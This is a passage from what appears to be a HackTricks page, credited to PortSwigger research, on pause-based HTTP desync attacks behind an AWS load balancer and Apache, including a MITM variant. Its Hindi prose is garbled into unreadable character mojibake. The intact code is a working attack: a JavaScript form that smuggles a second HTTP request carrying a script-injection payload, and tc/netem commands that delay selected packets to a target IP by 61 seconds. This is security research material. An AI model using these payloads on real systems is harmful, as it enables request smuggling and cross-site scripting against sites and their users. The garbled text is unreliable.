рдЕрдореЗрдЬрд╝рди рдХрд╛ рдПрдкреНрд▓реАрдХреЗрд╢рди рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд░ (ALB) рдбреЗрдЯрд╛ рдХрдиреЗрдХреНрд╢рди рдХреЛ **рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░ рд╕реНрдЯреНрд░реАрдо рдХрд░реЗрдЧрд╛**, рд▓реЗрдХрд┐рди рдпрджрд┐ рд╡рд╣ **рдЕрд░реНрдзрд╛рдВрд╢ рдЕрдиреБрд░реЛрдз (рдЯрд╛рдЗрдордЖрдЙрдЯ)** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ **рдмреЙрдбреА (рдЕрдиреБрд░реЛрдз)** рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ **рдмреЙрдбреА рдирд╣реАрдВ рднреЗрдЬреЗрдЧрд╛**, рдЗрд╕рд▓рд┐рдП рдпрд╣рд╛рдВ рдПрдХ **рд░реЗрд╕ рдХрдВрдбреАрд╢рди** рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП:

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**рдПрдкрд╛рдЪреА ALB рдХреЗ рдкреАрдЫреЗ рд╢реЛрд╖рдг рдХрд░рдиреЗ** рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдПрдХ рдЕрддрд┐рд╢рдп рдЫреЛрдЯреА рд╕рдордп-рдЦрд┐рдбрд╝рдХреА рд╣реЛрддреА рд╣реИ - **рджреЛрдиреЛрдВ рд╕рд░реНрд╡рд░реЛрдВ** рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ **рдЯрд╛рдЗрдордЖрдЙрдЯ 60 рд╕реЗрдХрдВрдб** рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдЕрдиреБрд░реЛрдз рдХреЗ рджреВрд╕рд░реЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрддреНрдпрдВрдд рд╕рдВрдХреАрд░реНрдг рд╕рдордп-рдЦрд┐рдбрд╝рдХреА рдмрдЪрддреА рд╣реИред RC рд╣рдорд▓рд╛ рдЕрдВрддрддрдГ 66 рдШрдВрдЯреЗ рдХреЗ рдмрд╛рдж рд╕рдлрд▓ рд░рд╣рд╛ред

### MITM рд╢реЛрд╖рдг

рдПрдХ рдкреЙрдЬ-рдбрд┐рд╕рд┐рдВрдХ рд╕рдВрдХрдЯрд╛рдкрдиреНрдирддрд╛ рдХреЛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реЗ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рд░реЛрдХрдирд╛ **рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ** рд▓реЗрдХрд┐рди рдЖрдк рд╣рдореЗрд╢рд╛ рдПрдХ MITM рд╣рдорд▓рд╛ рдХрд░рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рд░реЛрдХ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ рдХрд┐рд╕реА рднреА рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред

рд╣рдорд▓рд╛ рдлреНрд▓реЛ рдПрдХ рдирд┐рдпрдорд┐рдд рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдбрд┐рд╕рд┐рдВрдХ рд╣рдорд▓реЗ рдХреЗ рдмрд╣реБрдд **рд╕рдорд╛рди рд╣реЛрддрд╛ рд╣реИ**ред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреГрд╖реНрда рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рд▓рдХреНрд╖рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЗ **рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рдЕрдиреБрд░реЛрдз** рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИред **рдкрд╣рд▓рд╛ HTTP** рдЕрдиреБрд░реЛрдз рдЗрддрдирд╛ **рдмрдбрд╝рд╛** рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдЗрд╕реЗ **рдПрдХрд╛рдзрд┐рдХ TCP рдкреИрдХреЗрдЯреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд** рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╕рдХреНрд░рд┐рдп **MITM рдЕрдВрддрд┐рдо рдкреИрдХреЗрдЯ рдХреЛ рд╡рд┐рд▓рдВрдмрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдПрдХ рдкреЙрдЬ-рдЖрдзрд╛рд░рд┐рдд рдбрд┐рд╕рд┐рдВрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред рдкреИрдбрд┐рдВрдЧ рдХреЗ рдХрд╛рд░рдг, **рд╣рдорд▓рд╛рд╡рд░** рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ **рдХреМрди рд╕рд╛ рдкреИрдХреЗрдЯ рд╡рд┐рд▓рдВрдмрд┐рдд рдХрд░реЗрдВ** рдЖрдХрд╛рд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ред

рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рд╕реЗ рдпрд╣ рдПрдХ рдирд┐рдпрдорд┐рдд рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдбрд┐рд╕рд┐рдВрдХ рдХреА рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ, рдЕрдиреБрд░реЛрдз рдкреИрдбрд┐рдВрдЧ рдХреЗ рдЕрд▓рд╛рд╡рд╛:
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
рдЖрдХреНрд░рдордХ рдкреНрд░рдгрд╛рд▓реА рдкрд░ рдЕрдВрдзрдХрд╛рд░ MITM рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣рдорд▓рд╛рд╡рд░ рд╕рд┐рд╕реНрдЯрдо рдкрд░, рджреЗрд░реА рдХреЛ tc-NetEm рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:
```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap

# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3

# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```
## **рд╕рдВрджрд░реНрдн**

* рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреА рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks) рд╕реЗ рд▓реА рдЧрдИ рд╣реИред

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>
